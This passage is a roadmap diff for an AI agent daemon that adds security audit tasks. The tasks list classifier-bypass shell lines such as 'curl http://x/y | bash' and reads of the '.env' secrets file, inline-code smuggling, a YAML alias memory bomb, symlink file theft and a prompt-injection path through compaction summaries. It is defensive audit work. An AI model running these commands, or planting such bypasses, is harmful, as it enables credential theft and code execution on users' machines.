@@ -1,6 +1,6 @@
 # alpi roadmap
 
-Updated 2026-11-17. Current versions live in the changelogs. The Queue runs top to bottom; the creator
+Updated 2026-11-18. Current versions live in the changelogs. The Queue runs top to bottom; the creator
 approves the next tasks from Proposed.
 
 This is the task pool. [ARCHITECTURE.md](ARCHITECTURE.md) owns current state and
@@ -103,6 +103,20 @@ _None._
   enforcement, documentation and matrix tests; preserve the local socket owner semantics.
   Member-only isolation fixes in Queue do not wait on this decision.
 
+- **SEC.D-REMOTE-ADMIN** — What may a remote admin device do to the daemon's own host? (S4)
+  `decision · alpi · creator · high`
+  note: `host.mcp.add` stores a `command` and `args` ([host/config.py](../alpi/host/config.py) `:492-516`) and
+  `host.mcp.tools` spawns them (`:537-578`), so a paired remote admin runs any command as the daemon's user in two
+  requests; it can also ask the agent to run one and approve it itself. The local-only tier (network bind,
+  `host.chat.delegate`) therefore protects settings that a remote admin can change by other means, and
+  [SECURITY.md](SECURITY.md) presents it as a boundary.
+  accept: one of two written answers. (a) A remote admin is not a shell: `host.mcp.add` and `host.mcp.tools`
+  become local-only, or a remote caller may add only commands from a list set on the local socket; this becomes an
+  agent task with a test that a remote admin token is refused and the Unix socket still works. (b) A remote admin
+  equals a shell as the daemon's user: SECURITY.md says so and stops describing the local-only settings as
+  protection against a compromised admin device. SEC.LOCAL-ONLY-CHILDREN and SEC.ENV-KEYS are worth doing under
+  either answer, because they make the code match what SECURITY.md states today.
+
 - **OPS-CONN-POLICY** — Connection policy for the fleet
   `decision · alpi · creator · normal`
   accept: a written connection policy (one connection per person with an exact
@@ -139,7 +153,10 @@ _None._
 
 - **OPS-RETENTION** — Run journals and sessions have a retention window on every daemon
   `deploy · alpi · creator · normal`
-  note: the daemons keep every run journal forever unless a profile sets `retention`; the busiest fleet holds
+  depends: DAEMON.RETENTION-SCAN
+  note: until DAEMON.RETENTION-SCAN ships, the first sweep holds each profile's sessions lock for about as long as
+  expired sessions × journals × 55 µs, and no turn of that profile starts or saves meanwhile.
+  The daemons keep every run journal forever unless a profile sets `retention`; the busiest fleet holds
   about 2 GB of them. From alpi 0.18.2 the apps and `alpi setup` store the window as a number; earlier
   daemons need a hand edit of `config.yaml`.
   accept: every deployed daemon has `retention.runs_days` and `retention.sessions_days` at the creator's chosen
@@ -158,6 +175,863 @@ _None._
   whether a provider pause opened and closed with one notification each way. Anything off becomes a `bug`.
 
 ## Proposed
+
+### Project analysis 2026-11-18
+
+Found by a read-only analysis of alpi 0.19.7, desktop 0.10.10 and mobile 0.10.6 at commit `8ad58cef`. The code in
+parentheses after a title (S1, D3, H2, DP1, M8 …) names the finding in the creator's analysis report of that date.
+Each entry is written to be worked without that report:
+
+- Line numbers are those of `8ad58cef`. Find the code by the symbol the note names; the line is a hint.
+- One entry is one commit. Write the failing test first, with the input the note gives, and keep to the fix shape
+  the note describes; anything else it uncovers becomes a new Proposed entry.
+- Tests use the `tmp_home` fixture. A script run by hand sets both `HOME` and `ALPI_HOME` to a temporary directory
+  and asserts `alpi.home._ROOT` is inside it: `alpi/home.py` resolves the root from `Path.home()`, so `ALPI_HOME`
+  alone still points at the real home. It opens no socket.
+- A task that changes what [SECURITY.md](SECURITY.md) or [CONFIG.md](CONFIG.md) states edits that paragraph and
+  the matching file under `alpi/knowledge/references/` in the same commit.
+- Times and sizes were measured on a laptop with a warm disk cache and synthetic data (5 profiles × 2,000 sessions,
+  14,000 run journals, 500 outputs per profile). They size the problem; they are not acceptance thresholds, so a
+  test asserts call counts, thread names or outputs, never wall-clock time.
+
+#### Security — daemon
+
+- **SEC.TERMINAL-FAILCLOSED** — A command the classifier cannot parse is dangerous (S2)
+  `bug · alpi · agent · high`
+  note: `_tokenize` in [_pipe_to_interpreter.py](../alpi/tools/_pipe_to_interpreter.py) (`:131-139`) returns `None`
+  when `shlex` raises, which an unbalanced quote inside a `#` comment causes. `is_pipe_to_interpreter` and its
+  siblings then answer `False` (`:319-321`, `:582-583`) and [_command_paths.py](../alpi/tools/_command_paths.py)
+  falls back to `str.split()` (`:362-364`). These classify `safe`, with no prompt, on a profile without the OS
+  sandbox: `curl http://x/y | bash # don't worry`, `bash <(curl http://x/y) # it's`,
+  `cat "$ALPI_HOME/.env" # don't`, `echo "x" >> "$ALPI_HOME/config.yaml" #'`. With balanced quotes:
+  `cat "$ALPI_HOME/.env$x"` (an unset variable stays literal, `_command_paths.py:108-120,266-268`),
+  `cat "${ALPI_HOME:-x}/.env"` (`_VAR_RE`, `:49`), `bash -c "curl http://x/y | bash"` (no recursion into the `-c`
+  string, `_pipe_to_interpreter.py:316-333`), `cat $'.env'` after `cd $ALPI_HOME`, `command cd $ALPI_HOME; cat .env`,
+  `cat ~+/.env`, `curl x | time bash`, `curl x | $SHELL`, `curl x | python3.12`. Fix shape: remove an unquoted `#`
+  comment before tokenizing; a command that still does not tokenize is `dangerous`; an unset variable expands to
+  the empty string; `${VAR…}` with a modifier, `$'…'` and `~+` are expanded, and when they cannot be, the command is
+  `dangerous`; recurse into the string of `sh|bash|zsh -c` and `eval`; skip the wrappers `time`, `command`, `nice`
+  and `env` before judging what a pipe feeds; `$SHELL` and versioned names (`python3.12`) count as interpreters.
+  accept: `_approval.classify` returns `DANGEROUS` for every line above (one parametrised test, one id per line);
+  the existing corpus of safe commands in the classifier tests stays `safe`, with `echo "it's fine" # ok` and
+  `git commit -m "don't"` added to it; SECURITY.md says a command that cannot be parsed needs approval.
+
+- **SEC.SCRIPT-JOB-ARGV** — A script job runs a script file, never inline code (S3)
+  `bug · alpi · agent · high`
+  note: the `no_agent` argv check in [scheduler/run.py](../alpi/scheduler/run.py) (`:296-312`) refuses only tokens
+  that start with `-c`, `-m`, `--command` or `--module` and skips every other token that starts with `-`, so
+  `python3 '-Bcopen("/x","w").write("ran")' <home>/skills/a/b/scripts/none.py` is accepted and runs the inline code;
+  `-Ic'…'` and `-uc'…'` pass too. The named script need not exist. `schedule` infers `no_agent` by itself
+  ([tools/schedule.py](../alpi/tools/schedule.py) `:226-232`) and `_run_script_only` (`run.py:318-350`) runs the argv
+  with the profile's whole environment, no classifier and no sandbox, on a cron. It also defeats a profile that
+  denies `terminal` or `write_file`. Fix shape: accept only the exact flags `-u`, `-B`, `-I`, `-E`, `-s`, `-O` before
+  the script; refuse every other token that starts with `-`; require the script to exist as a regular file whose
+  resolved path is still under the directory `_under_skills` accepts today (do not narrow that directory).
+  accept: the three inputs are refused with a reason the `schedule` tool returns; a missing script, a symlink and a
+  path that resolves outside the skills directory are refused; `python3 -u <existing script>` and a bare
+  `<existing script>` still pass; tests on the validator and through `schedule(action="create")`.
+
+- **SEC.LOCAL-ONLY-CHILDREN** — A remote admin cannot reach a local-only setting through a child key (S5)
+  `bug · alpi · agent · high`
+  note: `_touches_local_only_config` in [server.py](../alpi/host/server.py) (`:98-106`) refuses a key equal to a
+  protected one or a parent of it, not a child. `host.config.set_field` with `key: "network.host.x"` or
+  `"host.allow_public_bind.x"` passes; `_set_dotted` ([device_state.py](../alpi/host/device_state.py) `:1111-1123`)
+  replaces the scalar with a dict and the readers coerce it with `str()` and `bool()`
+  ([network.py](../alpi/host/network.py) `:122-125,277-286`), so `resolve_bind_host` returns `0.0.0.0`.
+  `host.tcp_port.x` makes `resolve_host_tcp_port` raise and the WebSocket listener stays down until a local edit.
+  accept: under `require_token=True` with an admin token, `set_field` on `network.host.x`,
+  `host.allow_public_bind.x`, `host.tcp_port.x`, `alp.tcp_port.x` and `host.endpoints.x` answers `forbidden`;
+  `_set_dotted` refuses, on every transport, to descend through a value that is not a mapping (`invalid-params`);
+  the local socket still sets the five real keys.
+
+- **SEC.ENV-KEYS** — A remote admin sets only the environment names a client needs (S6)
+  `bug · alpi · agent · high`
+  note: `_check_env_key` in [host/config.py](../alpi/host/config.py) (`:12-35`) refuses nine names.
+  `host.providers.set_key` (`:122-146`) writes any other name to the root `.env`, which the daemon loads into
+  `os.environ` at start, so a remote admin sets `ALPI_NETWORK_HOST`, `ALPI_HOST_TCP_PORT`, `ALPI_ALP_TCP_PORT` and
+  `ALPI_HOST_WS_TRUSTED_PROXIES=0.0.0.0/0` (the last lets any client choose its rate-limit bucket): the same
+  network settings SEC.LOCAL-ONLY-CHILDREN protects. `host.email.gmail.begin` (`:676-680`) writes a `client_id` that
+  contains a newline as extra lines. Fix shape: first list every name the shipped desktop and mobile send through
+  the callers of `_check_env_key`. For a remote caller accept only the `api_key_env` of a provider in the built-in
+  catalogue or the profile's config, and the names the email and Gmail handlers write themselves. For every caller
+  refuse `ALPI_*`, `PYTHON*`, `LD_*` and `DYLD_*`, and refuse CR, LF and NUL in a value in `_append_env`.
+  accept: each of the four `ALPI_*` names and a value with `\n` is refused with an admin token; the local socket
+  can still set a provider key; a test per shipped client flow (add a provider key, add an email account) passes.
+
+- **SEC.RECIPE-YAML** — A recipe with YAML aliases is refused before it expands (S7)
+  `bug · alpi · agent · high`
+  note: `host.workgroup.recipes.describe` ([host/recipes.py](../alpi/host/recipes.py) `:266-276`) is reachable by any
+  paired member and calls `parse_recipe` on the event loop; [recipes.py](../alpi/recipes.py) (`:200,257`) uses
+  `yaml.safe_load` and then `str(data.get("briefing"))`. A 389-byte document of nested aliases
+  (`l0: &l0 ["x" × 10]`, `l1: &l1 [*l0 × 10]`, … `briefing: *l6`, plus `hub`, `name`, `task`) produced a 52 MB
+  reply and 213 MB of memory; each further level multiplies by ten. Fix shape: a loader class that raises on any
+  alias event, a cap on the text length (256 KB), `briefing`, `task` and `name` required to be scalars, and the
+  parse run through `read_pool`. Use the same loader for every recipe text a client sends (import included).
+  accept: the seven-level document answers `invalid-params` and allocates no expanded structure (assert the loader
+  raised before construction); a shipped recipe still parses; a recipe file alpi wrote itself round-trips.
+
+- **SEC.DEVICE-FIELDS** — A device's name and version are capped and printable (S8)
+  `bug · alpi · agent · high`
+  note: `register_device` in [connections.py](../alpi/host/connections.py) (`:1004-1026`) stores `name` and
+  `app_version` as sent, while `exchange_pairing` caps them at 128 and 64 (`:812-814`). Any paired member calls it.
+  A 20 MB name made `connections.yaml` 21 MB: 5.4 s per store write under the lock and 2 s per cold authentication
+  of every device; the minute-ly `last_seen` touch rewrites the store. Escape bytes in the name reach
+  `alpi audit-log` and the Connections view.
+  accept: both fields are cut to 128 and 64 characters and stripped of C0, C1 and ESC characters on write, and an
+  existing store is normalised when loaded; a 1 MB name with `\x1b[2J` is stored as at most 128 printable
+  characters; the existing registration tests stay green.
+
+- **SEC.LOG-FLOOD** — A client-supplied value cannot fill the service log (S9)
+  `bug · alpi · agent · normal`
+  note: [server.py](../alpi/host/server.py) logs `profile=%r` for a refused request with no cap and no rate limit
+  (`:1192-1195`; `:1125` has the same shape for a config key). Four `host.sessions.list` calls with a 2 MB `profile`
+  from a scoped member rotated every earlier line out of `service.log` and its backups, including the refusal lines
+  added in 0.18.9 and 0.19.7, and blocked the loop 0.9 s each.
+  `_loggable()` (`:1739`) already reduces the method to an identifier, but the profile and the scope list are
+  logged raw.
+  accept: every client-supplied value on those lines goes through `_loggable()` or is cut to 120 characters;
+  `host forbidden` lines are limited to one per connection, method and minute; a test sends the 2 MB value 100 times and finds lines under 300
+  bytes and no more than one per minute bucket.
+
+- **SEC.FETCH-REALPATH** — `host.attachments.fetch` judges the file it will actually read (S10)
+  `bug · alpi · agent · normal`
+  note: [attachments_rpc.py](../alpi/host/attachments_rpc.py) (`:217-239`) takes the kind (image or document) from
+  the requested name and the containment from the resolved path; image roots include the whole profile home
+  ([attachments.py](../alpi/attachments.py) `:81`) and `_caller_may_fetch` adds the lexical alias (`:165-168`). A
+  member whose turn can create a symlink (a sandboxed shell on Linux, the Docker backend, a skill) links `a.png` in
+  the workspace to another connection's session; the agent lists the workspace, so the path is offered; the fetch
+  returns the session as `image/png`. The same works for `config.yaml` and `memories/USER.md`.
+  accept: the extension, the kind and the deny check come from the resolved path; for a member a path whose
+  `realpath` differs from its `normpath` is refused and `_member_home_area(real)` applies; a test plants the three
+  links and each is refused for a member while a real image in the workspace is still served.
+
+- **SEC.DOCKER-CWD** — A fenced turn's shell runs inside the workspace under the Docker backend (S11)
+  `bug · alpi · agent · normal`
+  note: with `tools.execution.backend: docker`, [terminal.py](../alpi/tools/terminal.py) (`:208-228`) refuses only
+  the alpi home, `~/.ssh`, `~/.aws` and `~/.gnupg` as `cwd`, and
+  [execution_world.py](../alpi/core/execution_world.py) (`:60-66`) mounts `cwd.resolve()` read-write with no
+  `--user`. A member's call with `cwd=/etc` builds `docker run … --volume /etc:/etc`. SECURITY.md (`:110-118`)
+  says otherwise. The argv was verified; the escape was not run.
+  accept: a fenced turn (member, peer without `tools.allow`) is refused a `cwd` that resolves outside the profile's
+  workspace; the argv carries `--user <uid>:<gid>`; a unit test on the argv builder needs no Docker; an admin turn
+  is unchanged.
+
+- **SEC.MEMBER-ORACLES** — Two member-reachable verbs validate before they read (S12, S13)
+  `bug · alpi · agent · normal`
+  note: `host.chat.send` loads `sessions/<session_id>.json` before `_check_id`
+  ([chat.py](../alpi/host/chat.py) `:211-220` against `:238-240`): `session_id: "../../private/x"` answers
+  `session not found` when the file exists and `invalid-params` when it does not, and the daemon parses and caches
+  the file. `host.tools.list` is scope-free but reads `params.profile`
+  ([host/tools.py](../alpi/host/tools.py) `:56-60`), so a scoped member reads the `tools.deny` of a profile outside
+  its scope.
+  accept: `host.chat.send` with a session id that fails `_check_id` answers `invalid-params` without opening any
+  file (a spy on `open` under a planted directory); `host.tools.list` from a scoped member with an out-of-scope
+  profile answers `forbidden`.
+
+- **SEC.REDACT-2** — The redactor runs before every cap and knows the remaining token shapes (S14, S17)
+  `bug · alpi · agent · normal`
+  note: a PEM block cut by a cap is stored in clear, because the cap runs first
+  ([_redact.py](../alpi/_redact.py) `:74-88`; sessions cap at 400 characters, the replay sidecar at 4,000). Shapes
+  that pass today: `X_API_KEY=`, `EMAIL__W__PASSWORD=`, `auth_token=`, `pairing_token=`, alpi's own device and
+  pairing tokens, AWS secret and Azure keys, `ghs_`, `ghu_`, `ghr_`, `hf_`, `tskey-`, `ATATT`, `npm_`, `pypi-`,
+  `dckr_pat_`, `sk_live_`, `GOCSPX-`, Slack webhook URLs and a JSON `"password"` value. `logs/runs.jsonl`
+  `output_tail` uses its own `run_ledger._redact` ([run_ledger.py](../alpi/run_ledger.py) `:112-123`).
+  `mentions/<sender>.json` ([mention_thread.py](../alpi/alp/mention_thread.py) `:104`) and promotion candidates
+  ([promotion.py](../alpi/promotion.py) `:87`) are written unredacted with the umask mode.
+  accept: redaction runs before truncation at both caps (a PEM longer than the cap leaves no key material); one
+  test case per shape above; `run_ledger` calls `_redact.redact`; mentions and promotion candidates are redacted
+  and created `0600`; a 2 MB adversarial input through each new pattern finishes in under a second.
+
+- **SEC.SANDBOX-HOME** — The macOS sandbox profile protects the home alpi actually uses (S15)
+  `bug · alpi · agent · normal`
+  note: [_sandbox.py](../alpi/tools/_sandbox.py) (`:63-64,82-84`) hard-codes `/.alpi/`. With a home of another name
+  `.env` is readable and `config.yaml` writable inside the sandbox, and the root `secrets/` (the default profile's
+  Gmail tokens) is readable even under `.alpi`.
+  accept: the profile text is built from the resolved alpi root and denies `secrets/` at the root and per profile;
+  a unit test builds it for a home named `.myalpi` and finds that path in the deny rules; an `--integration` test
+  on macOS fails to `cat` the `.env` and a file under `secrets/` from inside the sandbox.
+
+- **SEC.TERMINAL-LEFTOVERS** — The classifier catches the remaining writes into the alpi home (S2b)
+  `bug · alpi · agent · low`
+  depends: SEC.TERMINAL-FAILCLOSED
+  note: `cp /tmp/config.yaml $ALPI_HOME/`, `tar xf e.tar -C $ALPI_HOME`, `mv ~/.ssh /tmp/s` and
+  `curl file://$ALPI_HOME/.env` are `safe`. The caution tier misses `rm -f -r ~`, `git push -f` and `doas`. An
+  allowlist glob `sudo apt *` approves `sudo apt update & sudo sh -c id`.
+  accept: the first four are `dangerous`, the next three `caution`; an allowlist pattern matches one simple command
+  and never a line containing `&`, `;`, `|`, `&&`, `||` or a substitution; tests for each.
+
+- **SEC.TOOL-BOUNDS** — `terminal` and `db` stop at a deadline (S16)
+  `bug · alpi · agent · low`
+  note: `terminal` is exempt from `tools.call_timeout_s` and its `timeout` argument has no ceiling
+  ([terminal.py](../alpi/tools/terminal.py) `:373,425,437`); a tool that passes the deadline keeps its thread
+  ([tool_executor.py](../alpi/core/tool_executor.py) `:110-121`); `db` installs no progress handler, so a recursive
+  CTE holds a core until the process restarts.
+  accept: `terminal`'s `timeout` is clamped to `tools.terminal.max_timeout_s` (new key, default 3600, documented in
+  CONFIG.md); `db` installs a `set_progress_handler` that aborts the statement at the tool deadline; a test runs an
+  endless recursive CTE and gets an error result within the deadline.
+
+- **SEC.BACKUP-LINKS** — A backup says which links it left out (S18)
+  `bug · alpi · agent · low`
+  note: `alpi backup` counts hardlinks and symlinks as files and `alpi restore` drops them silently
+  ([backup.py](../alpi/backup.py) `:487`): five reported, three written.
+  accept: links are reported as skipped, with their count, by both commands, and the two counts agree; a test with
+  one hardlink and one symlink.
+
+- **SEC.COMPACT-ROLE** — A compaction summary reaches the model as untrusted data, not as a system message (S19)
+  `bug · alpi · agent · low`
+  note: suspected, not exercised with a live model. [compaction.py](../alpi/compaction.py) (`:486-489`) inserts the
+  summary with `role: system`, built from tool outputs without their untrusted-data envelope. Since 0.18.0 it runs
+  mid-turn, so an injected page can come back as system text inside the same turn.
+  accept: the summary is a `user` message under an `[engine]` header with the same envelope tool output gets; the
+  compaction shape tests are updated; the pairing of `tool_calls` and replies still holds after a compaction.
+
+- **SEC.MCP-BOUNDS** — A misbehaving MCP server is cut off (S20)
+  `bug · alpi · agent · low`
+  note: one endless stdout line exhausts memory ([mcp/client.py](../alpi/mcp/client.py) `:362-370`); the joined
+  names of server `a` + tool `b__c` and server `a__b` + tool `c` collide
+  ([mcp/registry.py](../alpi/mcp/registry.py) `:203-208`).
+  accept: a line longer than 8 MB closes that server with an error result; a colliding tool name is skipped and
+  `alpi doctor` names it; tests with a fake server.
+
+- **SEC.OLD-MINORS** — Three minors of the 2026-10-28 audit that were neither fixed nor filed
+  `bug · alpi · agent · low`
+  note: one per commit. HOST-5: `host.attachments.stage` has no per-connection quota, the voice-script cache has no
+  cap and `host.voice.script` is an unmetered model call per distinct text. HOST-6: `_active[request_id]` is a global
+  map ([chat.py](../alpi/host/chat.py) `:327`), so two connections that pick the same id overwrite each other.
+  TOOLS-3: `clarification_messages` replays the model's own question as `role: user`
+  ([session.py](../alpi/session.py) `:496-500`).
+  accept: a byte quota per connection in staging, an LRU cap on the script cache and a per-connection rate limit on
+  the two voice verbs; `_active` keyed by connection, device and request id; the clarification question replayed
+  as assistant text; a test for each.
+
+#### Security — dependencies and the release chain
+
+- **SEC.DEPS-AUDIT** — Known advisories on the locked versions fail validation
+  `chore · alpi · agent · normal`
+  note: SECURITY.md promises "`pip-audit` before every release. Zero tolerance for known CVEs on the lockfile",
+  and nothing runs it: no workflow, not `scripts/validate.py`, not the hook. On 2026-11-18 it reported pillow
+  12.3.0 (fixed in 13.0.0), pypdf 6.21.0, filelock 3.28.0, setuptools 81.0.0 and certifi. `uv lock --dry-run
+  --upgrade-package …` moves certifi, filelock, pypdf (to 7.0.1, a major) and setuptools today; pillow does not
+  move, either because of the seven-day cooldown or a cap in another dependency (find out which).
+  accept: `scripts/validate.py` runs `pip-audit` on the locked versions when `uv.lock` or `pyproject.toml` changed,
+  and `publish.yml` runs it on every release; an advisory fails unless an allow file names it with a reason and an
+  expiry date; a network failure is reported as not checked, never as a pass; the lock moves the four packages and
+  the knowledge-ingest tests pass on pypdf 7; pillow is upgraded or listed in the allow file with what holds it; a
+  release-script test asserts the workflow step.
+
+- **SEC.ACTIONS-PIN** — Every GitHub action is pinned to a commit
+  `chore · alpi · agent · normal`
+  note: the repository half of SEC.REPO-GOVERNANCE. All seven workflows use mutable refs (`actions/checkout@v4`,
+  `tauri-apps/tauri-action@v0.6.2`, `dtolnay/rust-toolchain@stable`, `pypa/gh-action-pypi-publish@release/v1`, …)
+  in jobs that hold the Tauri signing key, the Apple credentials and the PyPI and Docker Hub publish rights. Build
+  tooling: no product bump.
+  accept: every `uses:` names a 40-character SHA with the version in a comment; `.github/dependabot.yml` covers
+  `github-actions`, the Python lock, both JS trees and Cargo; a release-script test fails on any `uses:` that is
+  not a SHA; one release of each pipeline still publishes.
+
+- **SEC.COMPOSE-HARDEN** — The shipped compose file drops what the container does not need
+  `chore · alpi · agent · low`
+  note: the image runs as uid 1000, but [docker-compose.yml](../docker-compose.yml) sets no `cap_drop`, no
+  `security_opt: ["no-new-privileges:true"]` and no pids or memory limit, and the base images
+  (`python:3.11-slim-trixie`, `node:24-trixie-slim`, `caddy:2-alpine`) are tags, not digests. Whether the browser
+  and the shell sandbox still start under `cap_drop: [ALL]` is unknown: this needs a creator `verify` on a real
+  container before any deployed compose file adopts it.
+  accept: the compose file carries the three settings and the images are pinned by digest; the image smoke test
+  launches the browser under them; DEPLOYMENTS.md and its reference say what each one does.
+
+#### Daemon runtime
+
+- **DAEMON.RETENTION-SCAN** — Deleting sessions scans the run journals once, not once per session (D3)
+  `bug · alpi · agent · high`
+  note: `_apply_sessions` in [cleanup.py](../alpi/cleanup.py) (`:667`) and `_delete_owned_session` in
+  [handlers.py](../alpi/host/handlers.py) (`:172`) call `runs.running_session_ids()`
+  ([runs.py](../alpi/runs.py) `:878-900`, which opens every journal twice) for each session id, inside
+  `sessions_lock(exclusive=True)`. `Session.save` and `runs.start` take the shared lock, so no turn of that profile
+  starts or saves meanwhile. Measured: 0.55 s per call at 10,000 journals, so 200 ids take about two minutes and a
+  first retention sweep of 3,000 expired sessions about half an hour. Fix shape: compute the running set once per
+  exclusive hold (it cannot grow while the lock is held, because `runs.start` needs the shared lock) and delete in
+  chunks of 50 ids, releasing the lock between chunks.
+  accept: with 2,000 journals and 100 expired sessions, `runs.summary` is called once per journal per chunk, not
+  once per session; a `Session.save` from another thread completes between two chunks; a session with a live run
+  is still never deleted (the existing safety tests stay green).
+
+- **DAEMON.SUB-IO** — Subscription writes leave the event loop (D1)
+  `bug · alpi · agent · high`
+  note: `pull` in [workgroup_client.py](../alpi/alp/workgroup_client.py) (`:1656`) and four sites in
+  [service.py](../alpi/service.py) (`:1288`, `:1330`, `:2849`, `:4068`→`:4125`) call `sub_mod.mutate` from a
+  coroutine. A changed mutate takes a blocking `flock`, loads, dumps the whole file, fsyncs and replaces it
+  ([subscription.py](../alpi/alp/subscription.py) `:675-695`): 8 ms at 12 subscriptions, 36 ms at 56 (2 MiB), 69 ms
+  at 5 MiB. The read side of this file was fixed in 0.11.15; the write side still runs on the loop. Fix shape: send
+  those calls through the `_sub_io` pool that already exists (`service.py:671`); every caller awaits the result
+  before it reads the subscription back.
+  accept: a test records the thread that runs `mutate` for a pull that brings posts, for a cursor advance and for
+  a dispatch stamp, and each is an `alpi-sub-io` thread; the workgroup poller tests stay green.
+
+- **DAEMON.EXECUTORS** — A full thread pool cannot stop heartbeats, authentication or cancel (D2)
+  `bug · alpi · agent · high`
+  note: nothing calls `set_default_executor`, so the default pool (`min(32, cpu + 4)`: six threads on two vCPUs)
+  carries whole engine turns ([chat.py](../alpi/host/chat.py) `:403`,
+  [alp/handlers.py](../alpi/alp/handlers.py) `:84,197`), run-now jobs for their full length
+  ([host/schedule.py](../alpi/host/schedule.py) `:149`), gate commands (`service.py:1580`), email probes whose
+  worker stays stuck after the 20 s timeout ([probes.py](../alpi/host/probes.py) `:41`), the sidecar append of
+  every chat frame (`chat.py:353`), the token check of every WebSocket message
+  ([server.py](../alpi/host/server.py) `:819`), the revocation watcher (`:995`) and most RPC reads. When it is full
+  no chat frame is written or sent, the 5 s heartbeat included, so clients reach their 75 s timeout; every WebSocket
+  RPC waits at authentication, `host.chat.cancel` included. Measured with every worker blocked: one sidecar append
+  waited until a worker freed. Fix shape: (1) a named executor for engine turns, `link.ask`, run-now and gate
+  commands, at least as large as the default pool is today so concurrency does not drop; (2) `_check_token_meta`
+  called inline (it costs 10 µs), with only the once-a-minute `_touch` left off the loop; (3) sidecar frames
+  written inline or by one writer thread that keeps their order; (4) email probes on a small pool of their own.
+  accept: a test blocks every worker of the turn executor with fake turns and still gets `host.version` over a
+  WebSocket and a chat heartbeat; a hung email probe leaves the default pool at its size; frame order in the
+  sidecar is unchanged.
+
+- **DAEMON.OUTPUTS-FAST** — Reading the inbox does not re-clean every notification (D5)
+  `bug · alpi · agent · high`
+  note: `_read_all` in [outputs.py](../alpi/outputs.py) (`:336-364`) runs `normalize_notification_body` on every
+  row, and `sanitize_emoji` (`:57-63`) tests each character against a list of ranges in Python (`:48-54`). It runs
+  for `list_outputs`, `read`, `append`, `mark_read`, `mark_unread`, `delete` and `mark_all_read`, under one
+  process-wide lock (`:325`). Measured with 500 rows of 1.9 KB: 250 ms for each of those operations, 1.3 s for
+  `host.outputs.list {all: true}` over five profiles; parsing the same JSON takes 1 ms. It holds the GIL, so a
+  thread does not spare the loop. Fix shape: one precompiled regular expression built from `_EMOJI_RANGES` and
+  `_EMOJI_SINGLES` minus `_ALLOWED_EMOJI`; `_read_all` cached per home by `(mtime_ns, size)` and dropped on every
+  write.
+  accept: the new `sanitize_emoji` equals the old one (kept as a test helper) on the existing normalisation tests
+  and on 2,000 random strings that mix emoji, allowed emoji and text; a second `list_outputs` with no write in
+  between normalises no row (a spy); a write invalidates the cache.
+
+- **DAEMON.BIND-FIRST** — The host socket accepts before the journal sweep and the model library load (D4, D13)
+  `bug · alpi · agent · normal`
+  note: `_main_all` calls `_start_new_profiles` (`service.py:251`), which runs `_sweep_runs` on the loop for every
+  profile (`:300`) before any task starts; the journal cache is in memory, so each restart is cold (1.6 s for
+  14,000 journals). The first loop iteration then starts `alp` before `host` (`:572-574`), and
+  `from alpi.alp import handlers` (`:4256`) and [host/approval.py](../alpi/host/approval.py) (`:42`) import litellm
+  (1 s). Separately, `host.network.status` calls `resolve_host_endpoints(home)` on the loop
+  ([network_rpc.py](../alpi/host/network_rpc.py) `:109`), which with no configured host runs `tailscale ip -4` and
+  `ifconfig` with 2 s timeouts each; the thread probe just before it (`:91`) does not fill the 30 s cache. Pairing
+  takes the same path (`connections.py:1180,1207`). This is the class of bug behind the 35-second socket.
+  accept: no `_sweep_runs` runs before the socket binds (the first reconcile pass runs it in a thread, with
+  `ensure_history_loaded()` still before the first alert); `host` is first in `_profile_tasks`; a subprocess test
+  imports `alpi.host.server` and `alpi.host.approval` and finds no `litellm` in `sys.modules`;
+  `resolve_host_endpoints` and `_pairing_network` run off the loop thread (a thread-identity spy) and the probe
+  warms the `detect_bind_ip` cache.
+
+- **DAEMON.WS-CONCURRENT** — A slow request does not hold the other requests on its socket (D6)
+  `bug · alpi · agent · normal`
+  note: [server.py](../alpi/host/server.py) awaits `dispatch` inside `async for message in ws` (`:692`, `:711`), so
+  requests on one socket run one after another; the per-device cap of eight only counts across sockets. The phone
+  multiplexes one socket per daemon (`mobile/src/lib/rpc.js:132`). Measured: a 1 s request followed by two instant
+  ones answered at 1.04, 1.06 and 1.06 s. Fix shape: each non-stream request runs as a task tracked per socket,
+  cancelled on close and counted by `_begin_device_rpc`; the token is still checked per message before the task
+  starts, and the `_ws_policy_replies` grace logic keeps its behaviour.
+  accept: with a fake socket, the two fast replies arrive before the slow one; a ninth concurrent request is
+  refused as today; a token revoked mid-flight still closes the socket with 1008; closing the socket cancels its
+  tasks.
+
+- **DAEMON.SUMMARIES-SCAN** — Profile summaries read each sessions directory once, and only when it changed (D7)
+  `chore · alpi · agent · normal`
+  note: `_latest_chat_for` and `_counts` in [device_state.py](../alpi/host/device_state.py) (`:175-201`) each walk
+  every session ([sessions.py](../alpi/host/sessions.py) `:53`, `:68`) with `iterdir`, `is_file` and two `stat`s:
+  62,000 `stat` calls and 200 ms for 10,000 sessions. The 3 s cache is dropped by every session save.
+  accept: one `os.scandir` pass computes the count and the latest chat; the result is kept per profile and reused
+  while the `sessions/` directory's `mtime_ns` is unchanged (`Session.save` replaces a file there, so it moves); a
+  test counts filesystem calls for two summaries with no change and finds a number that does not grow with the
+  session count; a save between two calls refreshes the row.
+
+- **DAEMON.FOLD-ONCE** — Listing workgroups folds each transcript once (D8)
+  `chore · alpi · agent · normal`
+  note: `_FOLD_CACHE_CAP = 64`, first in first out ([host/workgroup.py](../alpi/host/workgroup.py) `:297`,
+  `:436-441`), and `host.workgroups.list` calls `_pipeline_status`, `_pipeline_phase` and `_add_pipeline_note`, each
+  a separate `fold_task_state` (`device_state.py:1749`, `:1774`, `:1777`, `:909-918`). With 136 workgroups a warm
+  request re-ran 68 folds and decrypted all 12 hub transcripts again (140 ms; 62 ms with the cap raised). This is
+  the fold reuse left undone in 0.18.
+  accept: one fold per workgroup per request, with status, phase and note derived from it; the cache is LRU and
+  holds at least 4,096 entries; `pipeline_defs` reads the definitions without building a full subscription; a test
+  with 70 workgroups counts `decrypt_transcript` calls across two list requests and finds none on the second.
+
+- **DAEMON.CHAT-STREAM** — A stalled client does not stop a turn's replay file or its lock (D10, D15)
+  `bug · alpi · agent · normal`
+  note: in [chat.py](../alpi/host/chat.py) (`:349-364`, `:372-376`, `:409-455`) one consumer loop persists a frame
+  and then awaits `send_frame`. When the client stops reading, the sidecar stops too (a second device tailing sees
+  nothing), heartbeats stop, the unbounded queue takes the rest of the turn and the session stays busy after the
+  engine ends. Each token is its own frame: a thread hop, a redaction and a file append
+  ([_chat_events.py](../alpi/host/_chat_events.py) `:70-103`). In [events.py](../alpi/host/events.py)
+  (`:224-229`, `:247`) a subscriber whose queue is full loses frames with no sign of it. Read, not reproduced.
+  accept: adjacent `assistant_delta` or `reasoning_delta` frames already waiting in the queue are merged before
